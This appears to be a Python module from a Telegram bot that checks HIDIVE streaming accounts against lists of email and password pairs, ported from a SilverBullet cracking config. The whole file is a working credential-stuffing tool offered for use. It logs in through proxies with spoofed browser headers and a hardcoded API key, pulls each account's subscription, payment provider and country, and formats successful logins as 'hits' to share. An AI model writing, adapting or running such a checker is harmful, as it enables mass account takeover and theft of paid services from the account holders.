"""
bot/modules/hidive.py
~~~~~~~~~~~~~~~~~~~~~
Hidive account checker – mirrors the SilverBullet ``HIDIVE BY @XD_HR``
config exactly (same endpoints, headers, capture fields, hit/free logic).

Each check runs in its own ``requests.Session`` (isolated cookies/state)
and is dispatched via ``loop.run_in_executor()`` so the event loop stays free.
"""

from __future__ import annotations

import asyncio
from datetime import datetime
from typing import Optional

import requests

from bot.utils.logger import setup_logger

log = setup_logger("mod.hidive")

# ── API constants (from SB config) ──────────────────────────────────────
_API_KEY = "857a1e5d-e35e-4fdf-805b-a87b6f8364bf"
_APP_VAR = "6.58.0.a0c6b52"

_BASE = "https://dce-frontoffice.imggaming.com"


def _make_headers() -> dict[str, str]:
    """Return the full header dict matching the SB config."""
    return {
        "Host": "dce-frontoffice.imggaming.com",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "Realm": "dce.hidive",
        "x-app-var": _APP_VAR,
        "Accept-Language": "en-US",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": (
            "Mozilla/5.0 (Linux; Android 10; K) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/137.0.0.0 Mobile Safari/537.36"
        ),
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "app": "dice",
        "x-api-key": _API_KEY,
        "sec-ch-ua-platform": '"Android"',
        "Origin": "https://www.hidive.com",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "Referer": "https://www.hidive.com/",
        "Accept-Encoding": "gzip, deflate, br",
    }


# ── Synchronous check (mirrors SB config exactly) ──────────────────────

def _check_sync(
    email: str,
    password: str,
    proxy: Optional[dict[str, str]] = None,
) -> Optional[dict]:
    """Check a single Hidive account.

    Returns
    -------
    dict with capture fields  – for ACTIVE (hit) accounts
    dict with ``free=True``   – for INACTIVE / no-subscription (free) accounts
    ``None``                  – for bad credentials / errors
    """
    session = requests.Session()
    headers = _make_headers()

    try:
        # ── 1. LOGIN ────────────────────────────────────────────────────
        r1 = session.post(
            f"{_BASE}/api/v2/login",
            json={"id": email, "secret": password},
            headers=headers, proxies=proxy, timeout=15,
        )

        # SB KEYCHECK: Success = "authorisationToken",
        #              Failure = "NOT_FOUND" | "failedAuthentication"
        if "authorisationToken" not in r1.text:
            if "failedAuthentication" in r1.text or "NOT_FOUND" in r1.text:
                return None
            if r1.status_code == 401:
                return None
            return None

        token = r1.json()["authorisationToken"]
        headers["Authorization"] = f"Bearer {token}"

        # ── 2. ADDRESS → Country ────────────────────────────────────────
        country = ""
        try:
            r_addr = session.get(
                f"{_BASE}/api/v2/user/address",
                headers=headers, proxies=proxy, timeout=10,
            )
            country = r_addr.json().get("countryCode", "")
        except Exception:
            pass

        # ── 3. LICENCE-FAMILY → subscription data ──────────────────────
        r2 = session.get(
            f"{_BASE}/api/v2/licence-family"
            "?includeEntitlements=ALL_ACTIVE_USER_ENTITLEMENTS",
            headers=headers, proxies=proxy, timeout=10,
        )

        r2_text = r2.text

        # -- Parse captures exactly as the SB config does --
        plan_name = ""
        plan_type = ""
        auto_renewal = ""
        payment_provider = ""
        account_status = ""
        expiry_date = "N/A"
        days_left = "0"

        try:
            data = r2.json()
            families = data.get("licenceFamilies", [])
            if families:
                fam = families[0]

                # entitlements → Plan + Plan Type
                ents = fam.get("entitlements", [])
                if ents:
                    ent = ents[0]
                    plan_name = ent.get("name", "")
                    plan_type = ent.get("type", "")

                # paymentEventType → Has Auto Renewal
                auto_renewal = fam.get("paymentEventType", "")

                # paymentProviderInfo.type → Payment Provider
                ppi = fam.get("paymentProviderInfo")
                if isinstance(ppi, dict):
                    payment_provider = ppi.get("type", "")

                # status (SB uses LR between displayStyle … paymentProviderInfo)
                account_status = fam.get("status", "")

                # expiryTimestamp → Expiry Date + Days Left
                expiry_ms = fam.get("expiryTimestamp", 0)
                if expiry_ms:
                    try:
                        dt = datetime.fromtimestamp(expiry_ms / 1000)
                        expiry_date = dt.strftime("%Y-%m-%d")
                        days_left = str((dt - datetime.now()).days)
                    except Exception:
                        pass
        except Exception:
            pass

        # If JSON parsing didn't find the status, fall back to raw text
        # extraction (matches the SB LR parse between displayStyle and
        # paymentProviderInfo).
        if not account_status:
            try:
                chunk = r2_text.split('"displayStyle":')[1]
                chunk = chunk.split('"paymentProviderInfo"')[0]
                account_status = chunk.split('"status":"')[1].split('"')[0]
            except Exception:
                pass

        # ── SB KEYCHECK ─────────────────────────────────────────────────
        # Success = Account Status contains "ACTIVE"
        # Custom "FREE" = Account Status contains "INACTIVE"
        if "ACTIVE" in account_status.upper():
            return {
                "email": email,
                "password": password,
                "country": country,
                "plan": plan_name,
                "plan_type": plan_type,
                "auto_renewal": auto_renewal,
                "payment_provider": payment_provider,
                "account_status": account_status,
                "expiry": expiry_date,
                "days_left": days_left,
            }
        else:
            # INACTIVE / empty / no families → free account
            return {"email": email, "password": password, "free": True}

    except Exception as exc:
        log.debug("HD check failed for %s: %s", email, exc)
        return None


# ── Async wrapper ───────────────────────────────────────────────────────

async def check_account(
    email: str,
    password: str,
    proxy: Optional[dict[str, str]] = None,
) -> Optional[dict]:
    """Async wrapper — runs the synchronous check in a thread."""
    return await asyncio.to_thread(_check_sync, email, password, proxy)


# ── Formatting helpers ──────────────────────────────────────────────────

def format_hit(hit: dict) -> str:
    """Format a hit dictionary into a user-friendly Telegram message."""
    return (
        f"📺 **Hidive Hit**\n"
        f"┣ **Email:** `{hit['email']}`\n"
        f"┣ **Password:** `{hit['password']}`\n"
        f"┣ **Country:** {hit.get('country', '')}\n"
        f"┣ **Plan:** {hit.get('plan', '')}\n"
        f"┣ **Plan Type:** {hit.get('plan_type', '')}\n"
        f"┣ **Auto Renewal:** {hit.get('auto_renewal', '')}\n"
        f"┣ **Payment:** {hit.get('payment_provider', '')}\n"
        f"┣ **Status:** {hit.get('account_status', '')}\n"
        f"┣ **Expiry:** {hit.get('expiry', 'N/A')}\n"
        f"┗ **Days Left:** {hit.get('days_left', '0')}"
    )


def format_hit_line(hit: dict) -> str:
    """One-line capture format matching the SB sample exactly."""
    return (
        f"{hit['email']}:{hit['password']} | "
        f"Country = {hit.get('country', '')} | "
        f"Plan = {hit.get('plan', '')} | "
        f"Plan Type = {hit.get('plan_type', '')} | "
        f"Has Auto Renewal = {hit.get('auto_renewal', '')} | "
        f"Payment Provider = {hit.get('payment_provider', '')} | "
        f"Account Status = {hit.get('account_status', '')} | "
        f"Expiry Date = {hit.get('expiry', 'N/A')} | "
        f"Days Left = {hit.get('days_left', '0')}"
    )
